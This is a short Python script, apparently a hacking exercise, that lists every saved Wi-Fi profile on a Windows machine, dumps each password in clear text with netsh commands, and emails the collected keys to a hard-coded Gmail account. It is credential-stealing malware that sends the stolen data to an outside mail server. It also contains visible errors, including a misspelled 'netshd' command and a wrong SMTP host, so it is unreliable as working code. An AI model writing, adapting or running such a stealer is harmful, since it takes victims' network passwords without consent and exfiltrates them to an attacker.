#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):
    # Creating SMTP server instance with google server
    smtp_server = smtplib.SMTP("smtp.google.com","587")
    smtp_server.login(email,password)
    smtp_server.sendmail(email, email, message)
    smtp_server.quit()

def execute_command():
    #command to be executed at the target
    command = "netshd wlan show profile"
    networks_output = subprocess.check_output(command, shell=True)
    # Getting all network ssid
    networks_ssid = re.findall("(?:Profile\s*:\s)(.*)", networks_output)

    # for every ssid execute the command to get the passwords in clear text
    total_summary = ""
    for ssid in networks_ssid:
        clear_command = "netshd wlan show profile "+ ssid +" key=clear"
        current_result = subprocess.check_output(clear_command, shell=True)
        total_summary = total_summary + current_result

    send_mail("blablabla@gmail.com", "asddfg", total_summary)

execute_command()